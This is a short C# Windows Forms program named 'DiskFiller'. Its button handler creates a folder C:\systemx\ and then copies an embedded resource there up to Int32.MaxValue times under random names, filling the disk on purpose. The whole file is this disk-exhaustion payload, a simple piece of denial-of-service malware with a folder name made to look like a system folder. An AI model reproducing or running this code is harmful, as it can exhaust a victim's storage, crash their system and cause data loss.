using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
namespace DiskFiller
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Directory.CreateDirectory("C:\\systemx\\");

            Random name = new Random();
            int i = 0;
            while (i < Int32.MaxValue)
            {
                i++;
                File.WriteAllBytes("C:\\systemx\\" + name.Next(Int32.MaxValue), Properties.Resources.Source);
            }
        }
    }
}
